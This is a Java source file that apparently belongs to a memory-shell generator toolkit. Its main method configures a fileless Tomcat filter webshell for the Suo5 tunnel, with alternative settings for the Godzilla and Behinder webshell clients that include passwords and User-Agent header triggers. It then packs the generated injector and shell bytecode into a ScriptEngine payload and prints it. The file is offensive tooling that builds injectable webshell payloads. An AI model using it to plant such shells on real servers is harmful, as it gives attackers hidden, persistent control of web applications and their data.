package com.reajason.javaweb;

import com.reajason.javaweb.memshell.AbstractShell;
import com.reajason.javaweb.memshell.config.*;
import com.reajason.javaweb.memshell.packer.Packers;
import com.reajason.javaweb.memshell.utils.CommonUtil;
import lombok.SneakyThrows;
import net.bytebuddy.jar.asm.Opcodes;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.lang3.StringUtils;

import java.io.IOException;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
public class GeneratorMain {

    public static void main(String[] args) throws IOException {
        ShellConfig shellConfig = ShellConfig.builder()
                .server(Server.Tomcat)
                .shellTool(ShellTool.Suo5)
                .shellType(Constants.FILTER)
                .targetJreVersion(Opcodes.V1_8)
                .debug(true)
                .build();
        GodzillaConfig godzillaConfig = GodzillaConfig.builder()
                .pass("pass")
                .key("key")
                .headerName("User-Agent")
                .headerValue("test123").build();
        CommandConfig commandConfig = CommandConfig.builder().paramName("listener").build();

        BehinderConfig behinderConfig = BehinderConfig.builder()
                .pass("test123")
                .headerName("User-Agent")
                .headerValue("test").build();

        Suo5Config suo5Config = Suo5Config.builder()
                .headerName("User-Agent")
                .headerValue("test").build();

        InjectorConfig injectorConfig = new InjectorConfig();

        GenerateResult generateResult = generate(shellConfig, injectorConfig, suo5Config);
        if (generateResult != null) {
//            Files.write(Paths.get(generateResult.getInjectorClassName() + ".class"), generateResult.getInjectorBytes(), StandardOpenOption.CREATE_NEW);
//            Files.write(Paths.get(generateResult.getShellClassName() + ".class"), generateResult.getShellBytes(), StandardOpenOption.CREATE_NEW);
//            System.out.println(Base64.encodeBase64String(generateResult.getInjectorBytes()));
            System.out.println(Packers.ScriptEngine.getInstance().pack(generateResult));
//            Files.write(Path.of("target.jar"), Packer.INSTANCE.AgentJar.getPacker().packBytes(generateResult));
        }
    }

    public static GenerateResult generate(ShellConfig shellConfig, InjectorConfig injectorConfig, ShellToolConfig shellToolConfig) {
        Server server = shellConfig.getServer();
        AbstractShell shell = server.getShell();
        if (shell == null) {
            throw new IllegalArgumentException("Unsupported server");
        }
        if (StringUtils.isBlank(shellToolConfig.getShellClassName())) {
            shellToolConfig.setShellClassName(CommonUtil.generateShellClassName(server, shellConfig.getShellType()));
        }

        if (StringUtils.isBlank(injectorConfig.getInjectorClassName())) {
            injectorConfig.setInjectorClassName(CommonUtil.generateInjectorClassName());
        }

        return shell.generate(shellConfig, injectorConfig, shellToolConfig);
    }

    @SneakyThrows
    public static String generate(ShellConfig shellConfig, InjectorConfig injectorConfig, ShellToolConfig shellToolConfig, Packers packerInstance) {
        GenerateResult generateResult = generate(shellConfig, injectorConfig, shellToolConfig);
        if (generateResult != null) {
            return packerInstance.getInstance().pack(generateResult);
        }
        return null;
    }
}